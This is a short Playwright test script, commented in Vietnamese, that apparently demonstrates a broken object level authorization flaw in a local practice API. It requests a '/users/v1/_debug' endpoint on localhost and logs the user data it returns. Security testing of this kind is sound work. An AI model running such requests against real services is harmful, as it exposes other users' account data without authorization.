
// Kịch bản 2: Khai thác lỗ hổng Broken object level authorization

import { test, expect } from '@playwright/test';
import { PlaywrightTestConfig } from '@playwright/test';
const accessToken = '';

const config: PlaywrightTestConfig = {
  use: {
    baseURL: 'http://localhost:5002',
    extraHTTPHeaders: {
      Authorization: `Bearer ${accessToken}`,
    },
  },
};
export default config;

test("Exploiting Broken object level authorization", async ({ request }) => {
  const inforUser = await request.get(`/users/v1/_debug`, {
    headers:{
      Authorization: `Bearer ${accessToken}`
    }
  });
  expect(inforUser.ok()).toBeTruthy();
  expect(inforUser.status()).toBe(200);
  console.log(await inforUser.json());
});
